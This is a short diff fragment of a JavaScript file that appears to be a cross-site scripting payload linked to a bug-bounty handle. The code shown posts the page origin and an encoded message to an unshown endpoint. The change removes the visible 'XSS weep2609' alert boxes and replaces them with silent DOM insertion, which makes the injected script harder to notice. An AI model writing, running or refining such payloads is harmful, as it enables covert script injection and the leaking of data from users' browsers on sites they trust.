@@ -113,8 +113,9 @@ script.onload = function() {
             r.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
             r.send('origin=' + (document.location.origin === 'file://' ? 0 : document.location.origin) + '&msg=' + encodeURIComponent(msg) + '&id=' + 20119);
             console.log('Mission completed!');
-            alert('XSS weep2609 - Bug Bounty');//
-            alert('Mission Completed !');//
+            const chuoi = "Mission Completed weep2609 !";
+            const textNode = document.createTextNode("x");
+            document.getElementById("content").appendChild(textNode);
         })
         .catch(error => {
             console.error('Error in processing:', error);
